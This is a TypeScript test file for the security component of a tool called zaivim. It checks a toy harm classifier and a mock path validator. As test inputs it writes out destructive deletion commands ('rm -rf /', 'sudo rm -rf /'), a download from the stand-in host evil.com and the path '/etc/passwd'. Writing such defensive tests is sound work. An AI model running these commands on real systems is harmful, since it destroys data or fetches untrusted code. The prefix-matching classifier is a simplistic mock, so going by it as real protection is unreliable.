// @zaivim/e2e — Epic 2: Security block
// Run: pnpm test:e2e -- --epic e2

import { describe, it, expect } from 'vitest';
import { describeEpic } from './test-utils.js';

import type { ISecurityProvider, SecurityDecision } from '@zaivim/core';

describeEpic('e2', () => {

  // ---- Harm classification --------------------------------------------------

  it('S-level shell commands are classified as critical harm', () => {
    const classify = (cmd: string): string => {
      if (cmd.startsWith('rm -rf /') || cmd.includes('sudo rm')) return 'S';
      if (cmd.startsWith('wget ') || cmd.startsWith('curl ')) return 'A';
      return 'C';
    };

    expect(classify('rm -rf /')).toBe('S');
    expect(classify('rm -rf /etc')).toBe('S');
    expect(classify('sudo rm -rf /')).toBe('S');
    expect(classify('wget http://evil.com/payload')).toBe('A');
    expect(classify('ls -la')).toBe('C');
    expect(classify('echo hello')).toBe('C');
  });

  it('S-level harm classification rejects execution', () => {
    const decision: SecurityDecision = { allowed: false, riskLevel: 'S' as any, harmLevel: 'S' as any, reason: 'Destructive command rejected' };
    expect(decision.allowed).toBe(false);
    expect(decision.riskLevel).toBe('S');
    expect(decision.harmLevel).toBe('S');
  });

  it('mock security provider validates paths correctly', () => {
    const provider: ISecurityProvider = {
      sandboxType: 'none',
      validatePath: (p: string) => ({ allowed: p.startsWith('/tmp') || p.startsWith('/home') }),
      validateOperation: () => ({ allowed: true, riskLevel: 'C' as any }),
      isSandboxAvailable: () => false,
    };

    expect(provider.validatePath('/tmp/test').allowed).toBe(true);
    expect(provider.validatePath('/home/user').allowed).toBe(true);
    expect(provider.validatePath('/etc/passwd').allowed).toBe(false);
  });
});
